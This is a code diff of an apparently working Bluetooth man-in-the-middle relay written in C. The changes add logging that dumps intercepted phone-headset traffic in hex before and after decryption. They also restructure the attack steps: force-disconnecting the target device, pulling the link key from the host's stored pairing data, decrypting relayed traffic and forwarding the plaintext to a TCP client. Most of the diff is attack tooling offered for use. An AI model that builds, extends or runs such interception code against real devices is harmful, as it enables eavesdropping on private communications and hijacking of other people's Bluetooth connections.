@@ -121,7 +121,15 @@ int relay_loop(int phone_sock, int headset_sock, int tcp_server, int tcp_client)
                 return -1;
             }
             
-            DEBUG_PRINT("Received %zd bytes from phone", bytes);
+            INFO_PRINT("📱 PHONE → HEADSET: %zd bytes (encrypted)", bytes);
+            
+            // Log first 32 bytes of encrypted data
+            printf("[ENCRYPTED] ");
+            for (int i = 0; i < (bytes < 32 ? bytes : 32); i++) {
+                printf("%02x ", buffer[i]);
+            }
+            if (bytes > 32) printf("... (%zd more bytes)", bytes - 32);
+            printf("\n");
             
             uint8_t decrypted[MAX_BUFFER_SIZE];
             int dec_len = crypto_decrypt_payload(buffer, bytes, decrypted);
@@ -129,6 +137,16 @@ int relay_loop(int phone_sock, int headset_sock, int tcp_server, int tcp_client)
                 ERROR_PRINT("Decryption failed");
                 continue;
             }
+            
+            INFO_PRINT("🔓 DECRYPTED: %d bytes", dec_len);
+            
+            // Log first 32 bytes of decrypted data
+            printf("[DECRYPTED] ");
+            for (int i = 0; i < (dec_len < 32 ? dec_len : 32); i++) {
+                printf("%02x ", decrypted[i]);
+            }
+            if (dec_len > 32) printf("... (%d more bytes)", dec_len - 32);
+            printf("\n");
             
             if (tcp_client >= 0) {
                 if (tcp_send_data(tcp_client, decrypted, dec_len) < 0) {
@@ -144,6 +162,16 @@ int relay_loop(int phone_sock, int headset_sock, int tcp_server, int tcp_client)
                 ERROR_PRINT("Encryption failed");
                 continue;
             }
+            
+            INFO_PRINT("🔒 RE-ENCRYPTED: %d bytes", enc_len);
+            
+            // Log first 32 bytes of re-encrypted data
+            printf("[RE-ENCRYPTED] ");
+            for (int i = 0; i < (enc_len < 32 ? enc_len : 32); i++) {
+                printf("%02x ", encrypted[i]);
+            }
+            if (enc_len > 32) printf("... (%d more bytes)", enc_len - 32);
+            printf("\n\n");
             
             ssize_t sent = send(headset_sock, encrypted, enc_len, 0);
             if (sent < 0) {
@@ -163,7 +191,15 @@ int relay_loop(int phone_sock, int headset_sock, int tcp_server, int tcp_client)
                 return -1;
             }
             
-            DEBUG_PRINT("Received %zd bytes from headset (control data)", bytes);
+            INFO_PRINT("🎧 HEADSET → PHONE: %zd bytes (control/response)", bytes);
+            
+            // Log first 32 bytes of data
+            printf("[HEADSET DATA] ");
+            for (int i = 0; i < (bytes < 32 ? bytes : 32); i++) {
+                printf("%02x ", buffer[i]);
+            }
+            if (bytes > 32) printf("... (%zd more bytes)", bytes - 32);
+            printf("\n\n");
             
             ssize_t sent = send(phone_sock, buffer, bytes, 0);
             if (sent < 0) {
@@ -268,79 +304,65 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    INFO_PRINT("Step 1: Checking target device connection status");
+    INFO_PRINT("Step 1: Verifying target device is paired");
+    char verify_cmd[256];
+    snprintf(verify_cmd, sizeof(verify_cmd), 
+        "echo -e 'info %s\\nquit' | bluetoothctl 2>&1 | grep -q 'Paired: yes'", 
+        target_mac);
+    if (system(verify_cmd) != 0) {
+        ERROR_PRINT("Target device %s is not paired with this adapter", target_mac);
+        INFO_PRINT("Please pair the device first using:");
+        INFO_PRINT("  sudo bluetoothctl");
+        INFO_PRINT("  scan on");
+        INFO_PRINT("  pair %s", target_mac);
+        INFO_PRINT("  trust %s", target_mac);
+        INFO_PRINT("  quit");
+        return 1;
+    }
+    INFO_PRINT("✓ Target device is paired");
+    
+    INFO_PRINT("Step 2: Checking target device connection status");
     int target_connected = bt_check_connection_status(target_mac);
     
     if (target_connected) {
-        INFO_PRINT("⚠️  WARNING: Target device is currently connected to another device");
-        INFO_PRINT("MITM attack requires breaking this connection");
+        INFO_PRINT("⚠️  Target device is currently connected");
+        INFO_PRINT("Attempting to disconnect for MITM interception...");
         
         // Attempt to force disconnect
         if (bt_force_disconnect(source_mac, target_mac) < 0) {
             ERROR_PRINT("Could not break existing connection automatically");
             INFO_PRINT("Please manually disconnect the target device and press Enter...");
             getchar();
+        } else {
+            INFO_PRINT("✓ Target device disconnected successfully");
+            sleep(2);
         }
     } else {
-        INFO_PRINT("✓ Target device is not connected - ready for MITM");
+        INFO_PRINT("✓ Target device is not connected");
     }
     
-    INFO_PRINT("Step 2: Spoofing MAC address to %s", source_mac);
-    if (bt_spoof_mac_address(0, source_mac) < 0) {
-        ERROR_PRINT("MAC spoofing failed - continuing anyway");
-    }
-    
-    INFO_PRINT("Step 3: Auto-pairing with target device");
-    INFO_PRINT("Ensure target device %s is in pairing mode", target_mac);
-    INFO_PRINT("Auto-pairing will begin in 3 seconds...");
-    sleep(3);
-    
-    if (bt_auto_pair_device(target_mac) < 0) {
-        ERROR_PRINT("Auto-pairing failed");
-        INFO_PRINT("You must manually pair with the device:");
-        INFO_PRINT("  sudo bluetoothctl");
-        INFO_PRINT("  scan on");
-        INFO_PRINT("  pair %s", target_mac);
-        INFO_PRINT("  trust %s", target_mac);
-        INFO_PRINT("  connect %s", target_mac);
-        INFO_PRINT("  quit");
-        INFO_PRINT("Press Enter to continue after manual pairing...");
-        getchar();
-        
-        // Verify pairing was successful before continuing
-        INFO_PRINT("Verifying pairing status...");
-        char verify_cmd[256];
-        snprintf(verify_cmd, sizeof(verify_cmd), 
-            "echo -e 'info %s\\nquit' | bluetoothctl 2>&1 | grep -q 'Paired: yes'", 
-            target_mac);
-        if (system(verify_cmd) != 0) {
-            ERROR_PRINT("Device is not paired. Please complete pairing before continuing.");
-            return 1;
-        }
-        INFO_PRINT("Pairing verified successfully");
-    }
-    
-    INFO_PRINT("Step 4: Extracting link key");
+    INFO_PRINT("Step 3: Extracting link key from existing pairing");
     char link_key[64];
     if (bt_extract_link_key(adapter_mac, target_mac, link_key, sizeof(link_key)) < 0) {
-        ERROR_PRINT("Failed to extract link key");
-        ERROR_PRINT("Make sure the device is paired and the info file exists at:");
+        ERROR_PRINT("Failed to extract link key from paired device");
+        ERROR_PRINT("Make sure the device is properly paired and the info file exists at:");
         ERROR_PRINT("  %s/%s/%s/info", BLUETOOTH_INFO_PATH, adapter_mac, target_mac);
         return 1;
     }
+    INFO_PRINT("✓ Link key extracted successfully");
     
     if (crypto_init_link_key(link_key) < 0) {
         return 1;
     }
     
-    INFO_PRINT("Step 5: Creating TCP server");
+    INFO_PRINT("Step 4: Creating TCP server");
     int tcp_server = tcp_create_server(tcp_port);
     if (tcp_server < 0) {
         return 1;
     }
     int tcp_client = -1;
     
-    INFO_PRINT("Step 6: Setting up Bluetooth relay");
+    INFO_PRINT("Step 5: Setting up Bluetooth relay");
     
     int phone_sock = bt_create_l2cap_socket();
     if (phone_sock < 0) {
